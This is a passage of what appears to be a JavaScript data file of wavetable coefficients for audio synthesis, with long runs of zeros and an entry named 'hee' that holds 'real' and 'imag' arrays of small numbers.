0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0 ] } ],
	[ "hee",         { real: [ 0, -.18267, -.381543, .046629, -.280517, -.058269, .014912, .011407, -.00491, -.008831, .007088, .005653, -.007082, -.004146, .007708, .007322, -.007934, -.001923, .012704, -.003957, -.025076, .081539, -.028921, -.009431, .029387, -.030368, -.027489, .078646, -.029917, .032701, .025565, -.01946, .006748, -.000172, .001069, -.005152, .000071, -.002174, -.009055, .007263, .006293, -.002175, -.002678, -.00915, -.013944, -.006199, -.002361, .000379, .000083, .00035, -.003055, -.002105, -.000272, .00089, .000309, .000372, -.000033, .000019, .000394, .002459, .000636, .000037, -.000448, -.000024, .000167, .00011, -.000273, -.001496, .000576, -.000046, .000392, .001059, -.000534, -.001739, -.000852, .000874, -.000216, -.000045, .00067, -.000683, -.000112, .000774, .00061, -.000969, .001546, -.002348, -.000035, .000377, .000047, -.000193, -.000005, .000063, .00062, .001381, .000166, -.000893, -.001365, .000227, -.001158, -.000931, .000769, .000677, -.001738, -.000036, .00173, -.001, .00118, .000523, .000082, -.001654, .000389, -.000019, .000313, .000609, .000098, -.000023, -.000075, .000049, .000117, .00012, .000112, -.000222, -.000516, .000126, .000504, -.00001, .000212, .000085, -.000913, -.000224, .000658, -.000036, -.000046, -.000009, -.000536, .000095, -.000029, .000541, .001019, .000433, .001496, .000125, .001146, -.000755, .000334, .000348, -.000312, .00007, .000234, -.00004, -.000131, .000076, -.000156, .00013, -.000085, -.000091, .000188, -.000039, .000024, .000344, -.000242, -.00007, .000319, -.000416, .000025, -.00011, .000055, -.000194, .000158, .000058, .000076, -.00024, -.000046, .000113, -.000122, .000069, .000447, -.000375, .00049, -.000148, -.00026, .000153, -.000188, -.000029, .0001, -.00003, -.000155, .000216, .000072, -.00003, .00018, .000012, .00005, .000055, -.000011, -.000057, .000173, .000043, .000086, .000179, .000049, .000115, -.000086, .000031, .000013, -.000048, .000034, -.000004, .000054, .000046, -.000026, -.000003, .000006, -.000024, -.000016, -.000016, -.000021, -.000022, -.000023, -.000021, -.000019, -.000019, -.000019, -.000016, -.000013, -.000013, -.000013, -.000011, -.000009, -.00001, -.00001, -.000009, -.000007, -.000008, -.000008, -.000007, -.000006, -.000007, -.000007, -.000006, -.000005, -.000006, -.000007, -.000006, -.000005, -.000005, -.000006, -.000005, -.000004, -.000005, -.000005, -.000005, -.000004, -.000004, -.000005, -.000004, -.000003, -.000004, -.000005, -.000004, -.000003, -.000004, -.000004, -.000004, -.000003, -.000004, -.000004, -.000003, -.000003, -.000003, -.000004, -.000003, -.000003, -.000003, -.000004, -.000003, -.000002, -.000003, -.000004, -.000003, -.000002, -.000003, -.000003, -.000003, -.000002, -.000003, -.000003, -.000003, -.000002, -.000003, -.000003, -.000003, -.000002, -.000002, -.000003, -.000002, -.000002, -.000002, -.000003, -.000002, -.000002, -.000002, -.000003, -.000002, -.000002, -.000002, -.000003, -.000002, -.000002, -.000002, -.000003, -.000002, -.000002, -.000002, -.000002, -.000002, -.000001, -.000002, -.000002, -.000002, -.000001, -.000002, -.000002, -.000002, -.000001, -.000002, -.000002, -.000002, -.000001, -.000002, -.000002, -.000002, -.000001, -.000002, -.000002, -.000002, -.000001, -.000002, -.000002, -.000002, -.000001, -.000002, -.000002, -.000002, -.000001, -.000002, -.000002, -.000002, -.000001, -.000001, -.000002, -.000001, -.000001, -.000001, -.000002, -.000001, -.000001, -.000001, -.000002, -.000001, -.000001, -.000001, -.000002, -.000001, -.000001, -.000001, -.000002, -.000001, -.000001, -.000001, -.000002, -.000001, -.000001, -.000001, -.000002, -.000001, -.000001, -.000001, -.000002, -.000001, -.000001, -.000001, -.000002, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, 0, -.000001, -.000001, -.000001, 0, -.000001, -.000001, -.000001, 0, -.000001, -.000001, -.000001, 0, -.000001, -.000001, -.000001, 0, -.000001, -.000001, -.000001, 0, -.000001, -.000001, -.000001, 0, -.000001, -.000001, -.000001, 0, -.000001, -.000001, -.000001, 0, -.000001, -.000001, -.000001, 0, -.000001, -.000001, -.000001, 0, -.000001, -.000001, -.000001, 0, -.000001, -.000001, -.000001, 0, -.000001, -.000001, -.000001, 0, -.000001, -.000001, -.000001, 0, -.000001, -.000001, -.000001, 0, -.000001, -.000001, -.000001, 0, -.000001, -.000001, -.000001, 0, -.000001, -.000001, -.000001, 0, -.000001, -.000001, -.000001, 0, -.000001, -.000001, -.000001, 0, -.000001, -.000001, -.000001, 0, -.000001, -.000001, -.000001, 0, 0, -.000001, 0, 0, 0, -.000001, 0, 0, 0, -.000001, 0, 0, 0, -.000001, 0, 0, 0, -.000001, 0, 0, 0, -.000001, 0, 0, 0, -.000001, 0, 0, 0, -.000001, 0, 0, 0, -.000001, 0, 0, 0, -.000001, 0, 0, 0, -.000001, 0, 0, 0, -.000001, 0, 0, 0, -.000001, 0, 0, 0, -.000001, 0, 0, 0, -.000001, 0, 0, 0, -.000001, 0, 0, 0, -.000001, 0, 0, 0, -.000001, 0, 0, 0, -.000001, 0, 0, 0, -.000001, 0, 0, 0, -.000001, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0 ],  imag: [ 0, -.43237, -.202117, .451975, -.413897, .067733, -.004269, -.003175, -.010887, .002024, .010798, -.007897, -.001622, .006998, .000402, -.004589, .002325, .012148, -.000278, -.026627, .030999, .000779, .003562, .059443, -.000897, -.060501, .050517, -.071021, -.016851, .033358, -.020689, .017911, .003015, -.001239, -.001775, .002736, .004554, -.00915, -.004987, -.002883, -.00365, .007024, .012555, .004629, .005519, -.00267, -.005895, -.002137, .001283, .004861, .001504, .001201, -.000659, -.000842, .000634, .000375, .0001, -.000789, -.000378, .001145, .000364, .000262, -.000061, -.000102, .000159, .000251, -.000692, -.000857, -.000218, -.000893, .000143, .000225, -.000062, -.000535, -.000438, -.000737, -.001102, .000446, .000278, -.000187, .000046, .000234, -.000884, .00202, .000283, -.001297, .001203, -.000222, -.000362, -.000121, .000121, -.000191, .001329, -.000903, .00118, .000885, -.000269, -.000627, -.001597, .000511, .000786, -.000873, -.00213, .002391, -.00209, -.001152, .000507, .000232, -.000004, -.000316, -.000121, -.001509, -.000535, -.000056, .000351, .000182, -.000082, -.000408, .000097, .000283, .000473, -.000282, -.0003, .000261, -.00032, -.000398, .001237, -.000129, .000208, .000185, -.000386, -.00013, .000326, .000293, -.000305, -.000676, -.000229, -.000485, -.00119, -.000019, -.000357, .000688, .00034, -.000466, .0008, .000173, .000018, .000227, -.000105, .000098, .000167, -.000184, -.000029, -.000012, -.00009, -.000032, .000072, -.000079, .000188, -.000016, -.000123, .000382, -.000205, .00008, .000012, -.00011, .000033, -.000315, .000191, -.000128, -.000093, -.000093, .000028, -.000154, -.00029, .0002, -.000182, -.000142, .000841, -.00028, .00006, -.000014, -.000124, .000064, .000018, -.000067, .000051, .000001, -.000068, .00004, .000001, .000026, .000054, .000084, -.000004, -.000021, -.000016, -.000091, .00009, -.000108, .0001, .000023, .000091, .000047, -.000064, .000005, -.000043, -.000018, -.000049, -.000061, -.000034, -.000021, -.000049, -.000041, -.000028, -.00003, -.000024, -.000022, -.000017, -.000012, -.00001, -.000009, -.000006, -.000003, -.000004, -.000004, -.000003, -.000001, -.000002, -.000003, -.000002, -.000001, -.000002, -.000003, -.000002, -.000001, -.000002, -.000003, -.000002, -.000001, -.000002, -.000002, -.000002, -.000001, -.000002, -.000002, -.000001, -.000001, -.000001, -.000002, -.000001, -.000001, -.000001, -.000002, -.000001, 0, -.000001, -.000002, -.000001, 0, -.000001, -.000002, -.000001, 0, -.000001, -.000002, -.000001, 0, -.000001, -.000002, -.000001, 0, -.000001, -.000002, -.000001, 0, -.000001, -.000001, -.000001, 0, -.000001, -.000001, -.000001, 0, -.000001, -.000001, -.000001, 0, -.000001, -.000001, -.000001, 0, -.000001, -.000001, -.000001, 0, -.000001, -.000001, -.000001, 0, -.000001, -.000001, -.000001, 0, -.000001, -.000001, -.000001, 0, -.000001, -.000001, -.000001, 0, -.000001, -.000001, -.000001, 0, 0, -.000001, 0, 0, 0, -.000001, 0, 0, 0, -.000001, 0, 0, 0, -.000001, 0, 0, 0, -.000001, 0, 0, 0, -.000001, 0, 0, 0, -.000001, 0, 0, 0, -.000001, 0, 0, 0, -.000001, 0, 0, 0, -.000001, 0, 0, 0, -.000001, 0, 0, 0, -.000001, 0, 0, 0, -.000001, 0, 0, 0, -.000001, 0, 0, 0, -.000001, 0, 0, 0, -.000001, 0, 0, 0, -.000001, 0, 0, 0, -.000001, 0, 0, 0, -.000001, 0, 0, 0, -.000001, 0, 0, 0, -.000001, 0, 0, 0, -.000001, 0, 0, 0, -.000001, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 